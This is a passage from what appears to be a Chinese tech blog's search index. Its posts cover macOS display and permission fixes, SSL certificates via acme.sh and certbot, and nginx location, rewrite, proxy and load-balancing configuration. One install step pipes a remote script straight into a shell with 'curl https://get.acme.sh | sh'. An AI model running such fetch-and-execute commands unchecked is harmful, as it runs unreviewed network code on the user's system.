项目地址\n\n  https://github.com/xzhih/one-key-hidpi\n\n+ 参考教程:\n\n  https://blog.haitianhome.com/macbook-2k-hidpi.html\n\n  选择时选择最大的即可\n\n\n\n### 1.3 安装RDM软件\n\n+ 项目地址\n\n  https://github.com/avibrazil/RDM\n\n+ 参考教程:\n\n  https://www.zhihu.com/question/19682094/answer/669420795 \n\n\n\n# 2. 显示器接口介绍\n\n目前显示器的的接口有DP HDMI VGA DVI这几种，这些接口的形状也都不同，我们在选购主机的时候，一般都要考虑主机的显卡接口是否与显示器接口相匹配。VGA目前被淘汰掉了，这是因为VGA传输的是模拟信号。\n\n从接口性能上来看，显示器接口的性能是 DP>HDMI>DVI>VGA。\n\n+ **VGA接口**\n\n  长的多针孔\n\n  其中 VGA是模拟信号，目前已经被主流淘汰，这也是我们目前能在最新显卡上看到其他三种接口却看不到VGA接口的原因，DVI、HDMI、DP 都是数字信号，是目前的主流。\n\n+ **DVI接口**\n\n  DVI是高清接口，但不带音频，也就是说，DVI视频接线只传输画面图形信号，但不传输音频信号。但是DVI接口也有不少弊端：由于最初设计时是为PC端进行的，所以对于电视等兼容能力较差、只支持8bit的RGB信号传输、兼容性考虑，预留了不少引脚以支持模拟设备，造成接口体积较大。目前比较好的DVI接口能够传输2K画面，但也基本是极限了。\n\n+ **HDMI接口**\n\n  长的类似USB\n\n  HDMI既能传输高清图形画面信号，也能够传输音频信号。\n\n+ **DP接口**\n\n  DP接口也是一种高清数字显示接口标准，可以连接电脑和显示器，也可以连接电脑和家庭影院。DP接口可以理解是HDMI的加强版，在音频和视频传输方面更加强悍。\n\n  目前情况下，DP与HDMI在性能上没有多大区别。如果你使用3840*2160分辨率（4K），HDMI由于带宽不足，最大只能传送30帧，DP就没有问题。\n\n+ 参考资料\n\n  https://www.zhihu.com/question/19571221/answer/569037388\n\n\n\n# 3. 参考资料\n\n+ https://www.zhihu.com/question/19682094\n+ https://sspai.com/post/57549\n+ https://blog.haitianhome.com/macbook-2k-hidpi.html\n+ https://zhuanlan.zhihu.com/p/43249762","tags":["mac"],"categories":["使用"]},{"title":"mac开启摄像头和麦克风权限","url":"%2Fp%2F62e350b6.html","content":"\nmac无法开启摄像头和麦克风权限的解决方案。\n\n<!-- more -->\n\n# 1. 正常开启\n\n电脑->系统偏好设置->安全性与隐私->摄像头(麦克风)->点击下面的锁, 解开, 右侧点击加号添加app即可。\n\n但是如果没有 + 加号按钮添加一个应用，就需要重置权限了。\n\n# 2. 重置摄像头和麦克风权限\n\n### 2.1 开启csrutil\n\n保证csrutil开启, 在终端敲下面命令, 确定 enable, 如果不是, 需要开启\n\n```bash\ncsrutil status\n# System Integrity Protection status: disabled.\n```\n\n1 ）重启MAC，按住cmd+R直到屏幕上出现苹果的标志和进度条，进入Recovery模式；\n2 ）在屏幕最上方的工具栏找到实用工具（左数第3个），打开终端，输入：csrutil enable；\n3 ）关掉终端，重启mac；\n4） 重启以后可以在终端中查看状态确认。\n\n### 2.2 重置操作\n\n```bash\ntccutil reset Camera\ntccutil reset Microphone\n```\n\n+ 错误信息 tccutil: Usage: tccutil reset SERVICE [BUNDLE_ID]\n\n  在finder里打开`~/Library/Application\\ Support/com.apple.TCC`,  把这个玩意拖到垃圾箱里, 然后重启电脑, 再次执行上面的命令\n\n\n\n# 3. 参考资料\n\n+ https://apple.stackexchange.com/questions/384317/how-do-i-reset-camera-and-microphone-permission-on-macos-mojave\n","tags":["mac"],"categories":["使用"]},{"title":"acme.sh自动更新SSL证书","url":"%2Fp%2Fee822cec.html","content":"\n\n\n# 1. 证书类型\n\n+ 目前主流的SSL证书主要分为DV SSL(域名型) 、 OV SSL(组织型) 、EV SSL(增强型)。\n\n![1](acme.sh自动更新SSL证书/1.png)\n\n<!-- more -->\n\n+ DV、OV、EV证书在浏览器中显示的区别\n\nDV类型仅在浏览器显示一个小锁，OV和EV类型证书都包含了企业名称信息，但是，EV证书采用了更加严格的认证标准，浏览器在访问时，会在地址栏显示公司名称，地址栏变成绿色。绿的更加让人信任。\n\n![1](acme.sh自动更新SSL证书/2.png)\n\n\n\n# 2. ACME协议\n\nACME全称The Automatic Certificate Management Environment，而[acme.sh](https://link.jianshu.com/?t=https%3A%2F%2Fgithub.com%2FNeilpang%2Facme.sh)这个库，则能够在Linux上实现如下功能：\n\n1. 自动向Let's Encrypt申请证书；\n2. 自动调用各大云平台的api接口实现TXT解析配置；\n3. 证书下发后自动部署到nginx；\n4. 利用定时器，每60天自动更新证书，并完成自动部署。\n\n\n\n# 3. 配置证书\n\n### 3.1 安装acme.sh\n\n```bash\ncurl https://get.acme.sh | sh\n```\n\n这个自动安装过程完成了以下几个步骤：\n\n1. 拷贝sh脚本到~/.acme.sh/\n2. 创建alias别名acme.sh=~/.acme.sh/acme.sh   (`source ~/.bashrc`一下)\n3. 启动定时器 . 可以通过`crontab -l`查看\n\n\n\n### 3.2 dns验证并安装部署\n\nacme.sh 实现了 acme 协议支持的所有验证协议. 一般有两种方式验证: http 和 dns 验证. 接下来我们说下 dns的验证.\n\n+ 去阿里的控制台找到Ali_Key, Ali_Secret, 执行下面命名\n\n  ```bash\n  export Ali_Key=\"xxxxxxxx\" \n  export Ali_Secret=\"xxxxxxxx\"\n  ```\n\n+ 生成泛域名证书\n\n  ```bash\n  acme.sh --issue -d \"*.liuvv.com\" --dns dns_ali\n  ```\n  在`~/.acme`文件里生成了`*.liuvv.com` 文件夹\n\n+ 配置nginx\n\n  ```nginx\n  server {\n          listen 80 default_server;\n          listen [::]:80 default_server;\n          rewrite ^ https://$http_host$request_uri? permanent; #https跳转到https,永久重定向\n  }\n  \n  server {\n          listen 443 ssl default_server;\n          listen [::]:443 ssl default_server;\n  \n          ssl_certificate \"/etc/nginx/ssl/fullchain.cer\";\n          ssl_certificate_key \"/etc/nginx/ssl/*.liuvv.com.key\";\n  \n          root /home/levonfly/www;\n          index index.html;\n  }\n  ```\n\n  \n\n+ 安装证书\n\n  ```bash\n  sudo ./acme.sh  --installcert  -d  *.liuvv.com   \\\n          --key-file   /etc/nginx/ssl/*.liuvv.com.key \\\n          --fullchain-file /etc/nginx/ssl/fullchain.cer \\\n          --reloadcmd  \"service nginx force-reload\"\n  ```\n\n  + 这里用的是 `service nginx force-reload`, 不是 `service nginx reload`, 据测试, `reload` 并不会重新加载证书, 所以用的 `force-reload`\n  + nginx 的配置 `ssl_certificate` 使用 `/etc/nginx/ssl/fullchain.cer` ，而非 `/etc/nginx/ssl/<domain>.cer` ，否则 [SSL Labs](https://www.ssllabs.com/ssltest/) 的测试会报 `Chain issues Incomplete` 错误。\n\n+ 重新生成证书\n\n  ```bash\n  sudo ./acme.sh --renew -d *.liuvv.com --force\n  ```\n\n  通过这个命令,观看是否自动部署, 并观察证书的到期时间.\n\n\n\n# 4. 参考资料\n\n+ [https://github.com/Neilpang/acme.sh/wiki/%E8%AF%B4%E6%98%8E](https://github.com/Neilpang/acme.sh/wiki/说明)\n\n+ https://www.mustu.cn/acme-shhuo-qu-lets-encrypt-wildcardtong-pei-ssl/\n\n+ https://www.jianshu.com/p/a9f2088e099c\n\n+ https://deepzz.com/post/acmesh-letsencrypt-cert-auto-renew.html","tags":["acme.sh"],"categories":["https"]},{"title":"让自己的网站支持https","url":"%2Fp%2Ffcd8becb.html","content":"\n# 1. certbot\n\n+ 使用 Let’s Encrypt 提供的免费证书, 放到自己的服务器中, 并且在nginx配置好证书路径, 这样使用浏览器访问的时候就会见到熟悉的绿色小锁头了. 需要注意证书必须颁发给`某个域名`, 所以`ip地址`无效.\n\n+ 安装工具certbot\n\n```\ngit clone https://github.com/certbot/certbot\ncd certbot\nchmod +x certbot-auto\n\t\n# certbot-auto 即为自动化脚本工具, 他会判断你的服务是nginx还是apache, 然后执行对应逻辑\n./certbot-auto --help\n```\n<!-- more -->\n\n+ 生成证书\n\n```bash\n# webroot代表webroot根目录模式, certonly代表只生成证书 邮箱亲测没啥大用, 域名一定要和自己要申请证书的域名一致\n./certbot-auto certonly --webroot --agree-tos -v -t --email 你的邮箱 -w 服务器根目录 -d 你要申请的域名\n\t\n\t\n# 实际如下\n./certbot-auto certonly --webroot --agree-tos -v -t --email levonfly@gmail.com -w /var/www/html/ -d a.xuanyueting.com\n```\n\n然后会在/etc/letsencrypt/目录下生成相关文件, 你所需要的证书其实在`/etc/letsencrypt/live/a.xuanyueting.com/`目录中.\n\n`fullchain.pem`可以看作是证书公钥, `privkey.pem`是证书私钥, 是我们下面需要使用到的两个文件\n\n\n+ nginx 配置支持 https\n\n```nginx\nserver {\n    listen 80 default_server;\n    listen [::]:80 default_server;\n    rewrite ^ https://$http_host$request_uri? permanent;\n}\n\n\nserver {\n\t  listen 443 ssl default_server;\n    listen [::]:443 ssl default_server;\n    ssl_certificate \"/etc/letsencrypt/live/a.xuanyueting.com/fullchain.pem\";\n    ssl_certificate_key \"/etc/letsencrypt/live/a.xuanyueting.com/privkey.pem\";\n    \n    root /var/www/html;\n    ....\n}\n```\n\n+ 重启 nginx 验证\n```bash\nsudo service nginx restart\n```\n访问 a.xuanyueting.com, 会发现出现了小绿锁\n\n\n\n# 2. acme自动生成并更新证书\n\n+ https://www.liuvv.com/p/ee822cec.html\n\n\n\n# 3. freesn网站免费申请\n\n+ https://freessl.cn/ 注册账号\n\n+ 选择Let's Encrypt V2 支持通配符\n\n  ![1](让自己的网站支持https/1.png)\n\n+ 启动keymanager(需要下载), 设置一个密码\n\n+ 浏览器拉起keymanager, 会自动生成一个csr\n\n+ DNS 验证\n\n  ![1](让自己的网站支持https/2.png)\n\n  CA 将通过查询 DNS 的 TXT 记录来确定您对该域名的所有权。您只需要在域名管理平台将生成的 TXT 记录名与记录值添加到该域名下，等待大约 1 分钟即可验证成功。\n\n  \n\n  需要你到你的域名托管服务商那里添加一条 TXT 记录，其中记录名称为第二行的内容,记录值为第三行的内容。\n\n  ![1](让自己的网站支持https/3.png)\n\n+ 生成证书并且下载, 建议保存到key manager里\n\t![1](让自己的网站支持https/4.png)\n\n+ 保存到key manager里, 有效期3个月, 选择导出证书, nginx, 2个文件crt 和 key\n  ![1](让自己的网站支持https/5.png)\n  \n+ Nginx 配置\n\n  ```nginx\n  server {\n          listen 80 default_server;#一定要加上default_server,否则多个server会找第一个为默认\n          listen [::]:80 default_server;#监听所有的ipv6的地址\n          rewrite ^ https://$http_host$request_uri? permanent; #https 跳转到 https,永久重定向向\n  }\n  server {\n          listen 443 ssl default_server;\n          listen [::]:443 ssl default_server;\n          ssl_certificate \"/etc/nginx/ssl/*.liuvv.com_chain.crt\";\n          ssl_certificate_key \"/etc/nginx/ssl/*.liuvv.com_key.key\";\n          root /home/levonfly/www;\n          index index.html;\n  }\n  ```\n\n","tags":["http"],"categories":["https"]},{"title":"nginx的location和rewrite使用规则","url":"%2Fp%2F51e59d76.html","content":"\n# 0. 前言\n\nuri是url中除去协议\b和域名及参数后, 剩下的部分.\n\n比如请求的url为: http://www.liuvv.com/test/index.php?page=1, 则uri 为 `/test/index.php`\n\n<!-- more -->\n\n# 1. location指令\n\n### 1.1 location匹配uri的规则\n\n```\nlocation [ = | ~ | ~* | ^~ ] uri { ... }\n```\n\n+ `=`  精确匹配, uri要完全一样\n+ `^~`  这个是以某个开头, 不是正则匹配\n+ `~`  区分大小写正则匹配\n+ `~*` 不区分大小写正则匹配\n\n\n\n### 1.2 location匹配uri的优先级\n\n1. 首先先检查使用前缀字符定义的location，选择最长匹配的项并记录下来。\n\n2. 如果找到了精确匹配的location，也就是使用了`=`修饰符的location，结束查找，使用它的配置。\n\n3. 如果`^~`修饰符先匹配到最长的前缀字符串, 则不检查正则。\n\n4. 然后按顺序查找使用正则定义的location，如果匹配则停止查找，使用它定义的配置。\n\n5. 如果没有匹配的正则location，则使用前面记录的最长匹配前缀字符location。\n\n   \n\n> 基于以上的匹配过程，我们可以得到以下启示：\n\n1. 使用正则定义的location在配置文件中出现的顺序很重要。因为找到第一个匹配的正则后，查找就停止了，后面定义的正则就是再匹配也没有机会了。\n2. 使用精确匹配可以提高查找的速度。例如经常请求`/`的话，可以使用`=`来定义location。\n3. 优先级 `=`  >  `^~`  >  正则\n\n\n\n### 1.3 \u0010location 测试\n\n```nginx\nlocation = / {\n  return 502 \"规则A\\n\";\n}\nlocation = /login {\n  return 502 \"规则B\\n\";\n}\nlocation ^~ /static/ {\n  return 502 \"规则C\\n\";\n}\nlocation ^~ /static/files {\n  return 502 \"规则D\\n\";\n}\nlocation ~ \\.(gif|jpg|png|js|css)$ {\n  return 502 \"规则E\\n\";\n}\nlocation ~* \\.PNG$ {\n  return 502 \"规则F\\n\";\n}\nlocation /img {\n  return 502 \"规则G\\n\";\n}\nlocation / {\n  return 502 \"规则H\\n\";\n}\n```\n\n测试结果:\n\n```bash\nlevonfly@hk:~$ curl test.liuvv.com # 因为是=\n规则A\nlevonfly@hk:~$ curl test.liuvv.com/ # 因为是=\n规则A\nlevonfly@hk:~$ curl test.liuvv.com/login # 因为是=\n规则B\nlevonfly@hk:~$ curl test.liuvv.com/login/ # 多了/, 参考下面3.5\n规则H\nlevonfly@hk:~$ curl test.liuvv.com/abc\n规则H\n\nlevonfly@hk:~$ curl test.liuvv.com/static/a.html \n规则C\nlevonfly@hk:~$ curl test.liuvv.com/static/files/a.html # 更加精准\n规则D\n\nlevonfly@hk:~$ curl test.liuvv.com/a.png # 正则精准\n规则E\nlevonfly@hk:~$ curl test.liuvv.com/a.PNG # 正则精准\n规则F\nlevonfly@hk:~$ curl test.liuvv.com/static/a.png # ^~ 优先级更高\n规则C\n\nlevonfly@hk:~$ curl test.liuvv.com/img/a.gif #正则匹配优先\n规则E\nlevonfly@hk:~$ curl test.liuvv.com/img/a.tiff\n规则G\nlevonfly@hk:~$ curl test.liuvv.com/abc/123/haha #什么都匹配不到, 就到H\n规则H\n```\n\n\n\n### 1.4 location @name的用法\n\n@用来定义一个命名location。主要用于内部重定向，不能用来处理正常的请求。其用法如下：\n\n```nginx\nlocation / {\n    try_files $uri $uri/ @custom\n}\nlocation @custom {\n    # ...do something\n}\n```\n\n上例中，当尝试访问url找不到对应的文件就重定向到我们自定义的命名location（此处为custom）。\n\n值得注意的是，命名location中不能再嵌套其它的命名location。\n\n\n\n\n### 1.5 root和alias的区别\n\nnginx指定文件路径有两种方式root和alias.\n\n- root\n\n```\n[root]\n语法：root path\n默认值：root html\n配置段：http、server、location、if\n```\n\n例如:\n\n```nginx\nlocation ^~ /t/ { \n     root /www/root/html/;\n}\n```\n\n如果一个请求的URI是/t/a.html时，web服务器将会返回服务器上的/www/root/html/t/a.html的文件。\n\n- alias\n\n```\n[alias]\n语法：alias path\n配置段：location\n```\n\n例如:\n\n```nginx\nlocation ^~ /t/ { # 特殊的规则是, alias必须以\"/\" 结束\n alias /www/root/html/new_t/;\n}\n```\n\n如果一个请求的URI是/t/a.html时，web服务器将会返回服务器上的/www/root/html/new_t/a.html的文件。注意这里是new_t，因为alias会把location后面配置的路径丢弃掉，把当前匹配到的目录指向到指定的目录。\n\n\n\n### 1.6 nginx显示目录结构\n\nnginx默认是不允许列出整个目录的。如需此功能, 在server或location 段里添加上autoindex on;\n\n```nginx\nautoindex_exact_size off;\n默认为on，显示出文件的确切大小，单位是bytes。\n改为off后，显示出文件的大概大小，单位是kB或者MB或者GB\n\nautoindex_localtime on;\n默认为off，显示的文件时间为GMT时间。\n改为on后，显示的文件时间为文件的服务器时间\n```\n\n可以下面的例子:\n\n```nginx\nlocation ^~ \"/upload-preview\" {\n\t\talias /tmp/cistern/;\n\t\tautoindex on;\n\t\tautoindex_localtime on;\n}\n```\n\n\n\n### 1.7 URL尾部的`/`需不需要\n\n+ 如果URL结构是`https://domain.com/`的形式，尾部有没有`/`都不会造成重定向。因为浏览器在发起请求的时候，默认加上了`/`。虽然很多浏览器在地址栏里也不会显示`/`。这一点，可以访问[baidu](https://www.baidu.com/)验证一下。\n\n+ 如果URL的结构是`https://domain.com/some-dir/`。\n\n  尾部如果缺少`/`将导致重定向。因为根据约定，URL尾部的`/`表示目录，没有`/`表示文件。\n  \n  所以访问`/some-dir/`时，服务器会自动去该目录下找对应的默认文件。\n  \n  如果访问`/some-dir`的话，服务器会先去找`some-dir`文件，找不到的话会将`some-dir`当成目录，重定向到`/some-dir/`，去该目录下找默认文件。\n\n\n\n# 2. rewirte规则\n\n\n### 2.1 return指令\n\nreturn指令写在server和location里面\n\n```nginx\nreturn code [text];\nreturn code URL;\nreturn URL;\n```\n\n我们来看下面这个例子\n\n```nginx\n return 301 $scheme://www.baidu.com$request_uri; \n```\n\nreturn 指令告诉 nginx 停止处理请求, 直接返回301代码和指定\b重写过的URL到客户端. $scheme是指\b协议(http),$request_uri指\b包含参数的完整URI \n\n\n\n对于 3xx 系列响应码, url参数就是重写的url\n\n```nginx\nreturn (301 | 302 | 303 | 307) url;\n```\n\n对于其他响应吗, 可以出现一个字符串\n\n```nginx\nreturn (1xx | 2xx | 4xx | 5xx)[\"text\"]\n```\n\n例如:\n\n```nginx\nreturn 401 \"Access denied because token is expired or invalid\";\n```\n\n\n\n### 2.2 rewrite指令\n\nrewrite指令写在server和location里面, 规则会改变部分或整个用户的URL.\n\n```nginx\nrewrite regex URL [flag]\n```\n\n1. regex 正则表达式\n\n2. flag\n\n   + last\n\n     停止当前这个请求，并根据rewrite匹配的规则重新发起一个请求。新请求又从第一阶段开始执行, 找寻新的location\n\n   + break\n\n     break并不会重新发起一个请求，只是跳过当前的rewrite阶段，并执行本请求后续的执行阶段, 在同一个location里处理\n\n   + redirect\n\n     返回包含302的临时重定向\n\n   + permanent\n\n     返回包含301的永久重定向\n\n3. rewrite只能返回301或302, 如果有其他,需要后面加上return, 例如:\n\n```nginx\nrewrite ^(/download/.*)/media/(\\w+)\\.?.*$ $1/mp3/$2.mp3 last;\nrewrite ^(/download/.*)/audio/(\\w+)\\.?.*$ $1/mp3/$2.ra  last;\nreturn  403;\n```\n\n+ 匹配/download开头的URL,  然后替换相关路径\n+ `/download/cdn-west/media/file1` -> `/download/cdn-west/mp3/file1.mp3`\n\n+ 如果匹配不上, 将返回客户端403\n\n\n\n### 2.3 try_files指令\n\ntry_files指令写在server和location里面.\n\n```nginx\ntry_files file ... uri 或 try_files file ... = code\n```\n\ntry_files 指令的参数是一个或多个文件或目录的列表, 以及后面的uri参数. nginx会按照顺序检查文件或目录是否存在, 并用找到的第一个文件提供服务. 如果都不存在, 内部重定向到最后的这个uri\n\n例如:\n\n```nginx\nlocation /images/ {\n    try_files $uri $uri/ /images/default.gif;\n}\n\nlocation = /images/default.gif {\n    expires 30s;\n}\n```\n\ntry_files常用的变量:\n\n+ $uri 表示域名以后的部分\n\n+ $args  请求url中 ? 后面的参数 (不包括?本身)\n\n+ $is_args  判断$args是否为空\n\n  ```nginx\n  try_files $uri $uri/ /index.php$is_args$args; #这样就能避免多余的?号\n  ```\n  \n+ $query_string 和 $args相同\n\n+ $document_root root指令指定的值\n\n+ $request_filename 请求的文件路径\n\n+ $request_uri 原始请求uri  \n\n\n\n我们看个例子:\n\n```nginx\ntry_files /app/cache/ $uri @fallback; \nindex index.php index.html;\n```\n\n它将检测$document_root/app/cache/index.php,$document_root/app/cache/index.html 和 $document_root$uri是否存在，如果不存在着内部重定向到@fallback(＠表示配置文件中预定义标记点) 。\n\n你也可以使用一个文件或者状态码(=404)作为最后一个参数，如果是最后一个参数是文件，那么这个文件必须存在。\n\n\n\n我们来看一个错误:\n\n```nginx\nlocation ~.*\\.(gif|jpg|jpeg|png)$ {\n        root /web/wwwroot;\n        try_files /static/$uri $uri;\n}\n```\n\n原意图是访问`http://example.com/test.jpg`时先去检查`/web/wwwroot/static/test.jpg`是否存在，不存在就取`/web/wwwroot/test.jpg`\n\n但由于最后一个参数是一个内部重定向，所以并不会检查`/web/wwwroot/test.jpg`是否存在，只要第一个路径不存在就会重新向然后再进入这个location造成死循环。结果出现500 Internal Server Error\n\n```nginx\nlocation ~.*\\.(gif|jpg|jpeg|png)$ {\n        root /web/wwwroot;\n        try_files /static/$uri $uri 404;\n}\n```\n\n这样才会先检查`/web/wwwroot/static/test.jpg`是否存在，不存在就取`/web/wwwroot/test.jpg`再不存在则返回404 not found\n\n\n\n### 2.4 if指令\n\nif不是系统级的指令, 是和rewrite配合的. if 必须写在server和location里面.\n\n- 变量名:   如果是空字符串或\"0\"为FALSE\n- = 判断相等, != 判断不相等\n- ~ 和 ~*(不分区大小写) 将变量与正则匹配, 捕获可以用 $1 到 $9\n- !~ 和 !~* 用作不匹配运算符\n- 正则含有 } 或 ; 字符需要用引号括起来\n- 常用判断指令\n  - -f 和 !-f 判断是否存在文件(file)\n  - -d 和 !-d 判断是否存在目录(directory)\n  - -e 和 !-e 判断是否存在文件或目录(exists)\n  - -x 和 !-x 判断文件是否可执行(execute)\n\n\n\n例如下面的列子:\n\n```nginx\nif ($http_user_agent ~ Chrome) {\n    rewrite ^([^/]*)$ /chrome$1 break;\n}\n\nif ($request_method = POST){\n    return 405;\n}\n\nif (-f $request_filename) {\n    expires max;\n    break;\n}\n```\n\n\n\n# 3. proxy_pass模块\n\nproxy_pass指令是将请求反向代理到URL参数指定的服务器上，URL可以是主机名或者IP地址+端口号的形式，例如：\n\n```\nproxy_pass http://proxy_server;\nproxy_pass http://192.168.9.2:8000;\n```\n\n### 3.1 基本配置\n\n+ proxy_set_header：设置服务器获取用户的主机名或者真实ip地址，以及代理者的真实ip地址。 \n+ client_body_buffer_size：用于指定客户端请求主体缓冲区大小，可以理解为先保存到本地再传给用户 \n+ proxy_connect_timeout：表示连接服务器的超时时间，即发起tcp握手等候响应的超时时间 \n+ proxy_send_time：服务器的数据传回时间，在规定时间内服务器必须传回完所有数据，否则，nginx将断开这个连接 \n+ proxy_read_time：设置nginx从代理的后端服务器获取数据的时间，表示连接建立成功后，+ nginx等待服务器的响应时间，其实是nginx已经进入服务器的排队中等候处理的时间。 \n+ proxy_buffer_size：设置缓冲区大小，默认该缓冲区大小等于proxy_buffers设置的大小 \n+ proxy_buffers：设置缓冲区的数量和大小，nginx从代理的服务器获取响应数据会放置到缓冲区 \n+ proxy_busy_buffers_size：用于设置系统很忙时可以使用的proxy_buffers大小，官方推荐大小为proxy_buffers*2 \n+ proxy_temp_file_write_size：指定proxy缓存临时文件的大小\n\n\n\n### 3.2 proxy_set_header\n\n```bash\n语法:    proxy_set_header field value;\n默认值:    \nproxy_set_header Host $proxy_host; # 注意这个是proxy_host\nproxy_set_header Connection close;\n\n\n上下文:    http, server, location\n```\n\n允许重新定义或者添加发往后端服务器的请求头。value可以包含文本、变量或者它们的组合。 当且仅当当前配置级别中没有定义proxy_set_header指令时，会从上面的级别继承配置。默认情况下，只有两个请求头会被重新定义：\n\n```nginx\nproxy_set_header Host       $proxy_host;\nproxy_set_header Connection close;\n```\n\nproxy_set_header也可以自定义参数，如：proxy_set_header test paroxy_test;\n\n\n\n### 3.3 获取真实ip\n\n> 经过反向代理后，由于在客户端和web服务器之间增加了中间层，因此web服务器无法直接拿到客户端的ip, 通过$remote_addr变量拿到的将是反向代理服务器的ip地址. 如果我们想要在web端获得用户的真实ip，就必须在nginx这里作一个赋值操作，如下：\n\n```nginx\nproxy_set_header            X-real-ip $remote_addr;\n```\n\n其中这个X-real-ip是一个自定义的变量名，名字可以随意取，这样做完之后，用户的真实ip就被放在X-real-ip这个变量里了，然后，在web端可以这样获取：request.getAttribute(\"X-real-ip\")\n\n\n\n### 3.4 常见配置解释\n\n```\nserver {\n        server_name liuwei.fhyx.com;\n\n        proxy_set_header       X-Real-IP $remote_addr;\n        proxy_set_header       X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header       Host $http_host;\n        proxy_redirect         off;\n        proxy_http_version     1.1;\n        proxy_set_header       Upgrade $http_upgrade;\n        proxy_set_header       Connection \"upgrade\";\n        proxy_buffering        off;\n\n        location / {\n                proxy_pass     http://127.0.0.1:8000;\n        }\n\n        location ~ \"/(box|c|bub)/\" {\n                proxy_pass     http://127.0.0.1:8081;\n        }\n\n        location ~ /(a|o2)/ {\n                proxy_pass     http://127.0.0.1:3010;\n        }\n\n        location ~ \"/api/(v\\d{1,2})/\" {\n                proxy_pass     http://127.0.0.1:5010;\n        }\n\n}\n```\n\n+ proxy_set_header   X-real-ip $remote_addr;\n\n  可以在web服务器端获得用户的真实ip, 但是，实际上要获得用户的真实ip，不是只有这一个方法。\n\n+ proxy_set_header   X-Forwarded-For $proxy_add_x_forwarded_for;\n\n  X-Forwarded-For 请求头格式非常简单，就这样：\n\n  ```bash\n  X-Forwarded-For: client, proxy1, proxy2\n  ```\n  \n  可以看到，XFF 的内容由「英文逗号 + 空格」隔开的多个部分组成，最开始的是离服务端最远的设备 IP，然后是每一级代理设备的 IP。\n  \n   如果一个 HTTP 请求到达服务器之前，经过了三个代理 Proxy1、Proxy2、Proxy3，IP 分别为 IP1、IP2、IP3，用户真实 IP 为 IP0，那么按照 XFF 标准，服务端最终会收到以下信息：\n\n    ```bash\n  X-Forwarded-For: IP0, IP1, IP2\n    ```\n\n+ proxy_set_header       Host $http_host;\n\n  $host：请求中的主机头(HOST)字段，如果请求中的主机头不可用或者空，则为处理请求的server名称(处理请求的server的server_name指令的值)。值为小写，不包含端口!!!!\n\n  如果客户端发过来的请求的header中有’HOST’这个字段时，`$http_host`和`$host`都是原始的’HOST’字段\n\n  比如请求的时候HOST的值是www.csdn.net 那么反代后还是www.csdn.net\n\n  如果客户端发过来的请求的header中没有有’HOST’这个字段时， 建议使用$host，这表示请求中的server name。\n\n\n\n\n# 4. websocket反向代理\n\n+ nginx 首先确认版本必须是1.3以上。\n\n+ map指令的作用： 该作用主要是根据客户端请求中$http_upgrade的值，来构造改变$connection_upgrade的值，即根据变量$http_upgrade的值创建新的变量$connection_upgrade， 创建的规则就是{}里面的东西。其中的规则没有做匹配，因此使用默认的，即 $connection_upgrade的值会一直是 upgrade。然后如果 $http_upgrade为空字符串的话， 那值会是 close。\n\n```nginx\n#必须添加的\nmap $http_upgrade $connection_upgrade {\n        default upgrade;\n        '' close;\n}\n\nupstream websocket {\n    ip_hash;\n    #转发到服务器上相应的ws端口\n    server localhost:3344;\n    server localhost:8011;\n}\nserver {\n    listen 80;\n    server_name a.liuvv.com;\n    location / {\n    \n        #转发到http://websocket\n        proxy_pass http://websocket;\n        proxy_read_timeout 300s;\n        proxy_send_timeout 300s;\n\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n    \n        #升级http1.1到 websocket协议  \n        proxy_http_version 1.1;\n        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection  $connection_upgrade;\n    }\n}\n```\n\n\n\n# 5. 参考资料\n\n+ https://nginx.org/en/docs/\n+ [Nginx配置location、if以及return、rewrite和 try_files 指令](https://www.xiebruce.top/710.html)\n+ [Nginx 基本功能 - 将 Nginx 配置为 Web 服务器](https://blog.csdn.net/kikajack/article/details/79322194)\n+ [Nginx 的 try_files 指令使用实例](https://www.hi-linux.com/posts/53878.html)\n+ [HTTP 请求头中的 X-Forwarded-For](https://imququ.com/post/x-forwarded-for-header-in-http.html)","tags":["nginx"],"categories":["nginx"]},{"title":"nginx通过upstream实现负载均衡","url":"%2Fp%2F4c38afcc.html","content":"\n### 1. nginx upstream 负载均衡\n\nupstream 模块负债负载均衡模块，如果Nginx没有仅仅只能代理一台服务器的话，那它也不可能像今天这么火，Nginx可以配置代理多台服务器，当一台服务器宕机之后，仍能保持系统可用。具体配置过程如下：\n\n 在http节点下，添加upstream节点。\n\n```nginx\nupstream levonfly { \n      server 10.0.6.108:7080; \n      server 10.0.0.85:8980; \n}\n```\n\n将server节点下的location节点中的proxy_pass配置为：http:// + upstream名称，即\"http://levonfly\".\n\n```nginx\nlocation / { \n            root  html; \n            index  index.html index.htm; \n            proxy_pass http://levonfly; \n}\n```\n\n现在负载均衡初步完成了。upstream按照轮询（默认）方式进行负载，每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除。虽然这种方式简便、成本低廉。\n<!-- more -->\n\n\n### 2. upstream 负载均衡的模式\n\nnginx的upstream支持5种分配方式，下面将会详细介绍，其中，前三种为Nginx原生支持的分配方式，后两种为第三方支持的分配方式：\n\n##### 2.1 轮询(默认)\n\n轮询是upstream的默认分配方式，即每个请求按照时间顺序轮流分配到不同的后端服务器，如果某个后端服务器down掉后，能自动剔除。\n\n```nginx\nupstream backend {\n  server 192.168.1.101:8888;\n  server 192.168.1.102:8888;\n  server 192.168.1.103:8888;\n}\n```\n\n##### 2.2 weight        \n\n轮询的加强版，即可以指定轮询比率，weight和访问几率成正比，主要应用于后端服务器异质的场景下。\n\n```nginx\nupstream backend {\n  server 192.168.1.101 weight=1;\n  server 192.168.1.102 weight=2;\n  server 192.168.1.103 weight=3; # 是101访问率的3倍\n}\n```\n\n##### 2.3 ip_hash        \n\n每个请求按照访问ip（即nginx的前置服务器或者客户端IP）的hash结果分配，这样每个访客会固定访问一个后端服务器，可以解决session一致问题。\n\n```nginx\nupstream backend {\n  ip_hash;\n  server 192.168.1.101:7777;\n  server 192.168.1.102:8888;\n  server 192.168.1.103:9999;\n}\n```\n\n##### 2.4 fair(第三方) \n\nfair顾名思义，公平地按照后端服务器的响应时间（rt）来分配请求，响应时间短即rt小的后端服务器优先分配请求。\n\n```nginx\nupstream backend {\n  server 192.168.1.101;\n  server 192.168.1.102;\n  server 192.168.1.103;\n  fair;\n}\n```\n\n##### 2.5 url_hash(第三方)\n\n与ip_hash类似，但是按照访问url的hash结果来分配请求，使得每个url定向到同一个后端服务器，主要应用于后端服务器为缓存时的场景下。\n\n```nginx\nupstream backend {\n  server 192.168.1.101;\n  server 